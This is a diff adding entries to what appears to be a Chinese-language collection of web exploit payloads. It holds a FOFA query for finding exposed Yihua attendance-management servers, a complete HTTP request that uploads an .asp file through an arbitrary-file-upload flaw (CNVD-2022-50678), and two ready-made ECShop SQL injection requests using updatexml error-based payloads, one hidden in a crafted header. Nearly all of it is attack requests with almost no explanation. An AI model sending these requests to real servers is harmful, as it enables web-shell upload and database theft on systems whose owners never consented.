@@ -1037,3 +1037,55 @@ categoryId=1*
 ```
 
 https://www.freebuf.com/vuls/345062.html
+
+## 亿华考勤管理系统 任意文件上传漏洞cnvd-2022-50678
+
+```
+# fofa：body="/api/shengcheng_img.ashx?a="
+# 文件地址为回显地址。
+POST /handle/unloadfile.ashx HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------21909179191068471382830692394
+Connection: close
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors,
+Sec-Fetch-Site: same-origin
+
+-----------------------------21909179191068471382830692394
+Content-Disposition: form-data; name="file"; filename="test.asp"
+Content-Type: image/jpeg
+
+test
+-----------------------------21909179191068471382830692394
+Content-Disposition: form-data; name="action"
+
+unloadfile
+-----------------------------21909179191068471382830692394
+Content-Disposition: form-data; name="filepath"
+
+./
+-----------------------------21909179191068471382830692394
+```
+
+## Ecshop两个SQL注入
+
+```
+# 注入1
+POST /delete_cart_goods.php HTTP/1.1
+Host:
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+Content-Type: application/x-www-form-urlencoded
+
+id=0||(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))
+
+# 注入2,需要以普通用户登录。
+POST /user.php?act=collection_list HTTP/1.1
+Host:
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+X-Forwarded-Host': '45ea207d7a2b68c49582d2d22adf953apay_log|s:55:"1' and updatexml(1,insert(user(),1,1,0x7e),1) and '";|45ea207d7a2b68c49582d2d22adf953a
+Cookie:ECS_ID={{ecsid}}
+```
+
